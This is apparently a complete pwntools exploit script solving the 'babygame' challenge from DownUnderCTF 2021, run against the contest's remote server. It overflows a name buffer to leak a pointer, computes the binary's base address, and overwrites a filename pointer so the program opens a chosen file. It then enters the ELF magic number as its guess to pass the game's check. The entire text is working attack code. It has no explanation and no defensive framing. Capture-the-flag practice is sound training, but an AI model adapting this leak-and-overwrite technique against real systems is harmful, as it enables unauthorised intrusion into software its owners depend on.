from pwn import *

# r = process("./babygame")
# gdb.attach(r)
r = remote("pwn-2021.duc.tf", 31907)

r.recvuntil(b"name?")
r.send(b'a'*30+b"bb")
r.recvuntil(b">")
r.sendline(b"2")

randbuf = r.recvuntil("\n").split(b"bb")[1][:6]
randbuf = int.from_bytes(randbuf, "little")

base = randbuf - 0x2024
name = base + 0x40a0

payload = b'/usr/bin/ls\x00'
payload += b"a"*(32-len(payload))
payload += p64(name)

r.sendline(b"1")
r.recvuntil(b"to?")
r.sendline(payload)
r.recvuntil(b">")
r.sendline(b"1337")
r.recvuntil(b"guess:")

elf = 0x464c457f

r.sendline(str(elf))

r.interactive()





